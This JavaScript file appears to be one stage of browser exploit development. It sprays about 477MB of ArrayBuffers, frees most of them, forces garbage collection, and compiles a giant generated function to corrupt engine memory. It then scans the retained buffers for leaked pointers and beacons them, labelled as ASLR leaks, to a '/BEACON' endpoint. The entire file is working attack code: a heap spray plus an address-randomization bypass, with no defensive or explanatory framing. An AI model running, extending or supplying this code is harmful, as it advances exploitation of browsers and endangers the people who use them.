// p150k — Find maximum spray size that still allows compilation
// Tests: spray N → free → GC → compile → beacon success/fail
// No sweep/call — just finding the memory ceiling.
// Beacon prefix: V150K-

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V150K-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  var BUF_SZ = 100096;
  // Test with 5000 buffers (477MB) — p150i wave1 succeeded at this
  var SPRAY = 5000;

  var spray = [];
  try {
    for (var i = 0; i < SPRAY; i++) spray.push(new ArrayBuffer(BUF_SZ));
  } catch(e) {
    B('SPRAY-OOM-' + spray.length);
  }
  B('SPRAY-' + spray.length);

  // Keep 500 targets
  var targets = [];
  var tViews = [];
  var tStride = Math.max(1, Math.floor(spray.length / 500));
  for (var i = 0; i < spray.length && targets.length < 500; i += tStride) {
    targets.push(spray[i]);
    tViews.push(new Uint8Array(spray[i]));
  }

  spray.length = 0;
  spray = null;
  B('FREED');

  // Heavy GC — force kernel to reclaim MADV_FREE pages
  for (var g = 0; g < 20; g++) {
    var junk = [];
    for (var j = 0; j < 30000; j++) junk.push({x: j, y: String(j)});
    junk = null;
  }
  B('GC');

  // Now compile
  var N = 38348816;
  B('BUILD');

  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);

  var parts = ['window.__p150fn=function(a){'];
  for (var c = 0; c < nChunks; c++) parts.push(callChunk);
  parts.push('a();'.repeat(rem));
  parts.push('};window.__p150ok=1;');
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');

    // SUCCESS — this spray size works with compilation
    // Now call the function to test the sweep
    B('CALLING');
    try {
      window.__p150fn(function() { throw 'STOP'; });
    } catch(e) {
      B('CAUGHT-' + String(e).substring(0, 20));
    }
    B('SURVIVED');

    // Scan
    setTimeout(function() {
      B('SCAN');
      var hits = 0;
      var leaks = [];
      for (var i = 0; i < tViews.length; i++) {
        var v = tViews[i];
        var hasData = false;
        for (var s = 0; s < v.length; s += 112) {
          if (v[s+12] !== 0 || v[s+24] !== 0) { hasData = true; break; }
        }
        if (!hasData) continue;
        hits++;
        if (hits <= 5) {
          for (var off = 24; off + 8 <= v.length; off += 112) {
            if (v[off]|v[off+1]|v[off+2]|v[off+3]|v[off+4]|v[off+5]|v[off+6]|v[off+7]) {
              var hex = '';
              for (var h = 7; h >= 0; h--) hex += (v[off+h]<16?'0':'') + v[off+h].toString(16);
              B('PTR-' + i + '-O' + off + '=' + hex);
              leaks.push(hex);
              break;
            }
          }
        }
      }
      B('RESULT-h' + hits + '-l' + leaks.length);
      for (var l = 0; l < leaks.length; l++) B('ASLR-' + l + '-' + leaks[l]);
      B('DONE');
    }, 100);
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
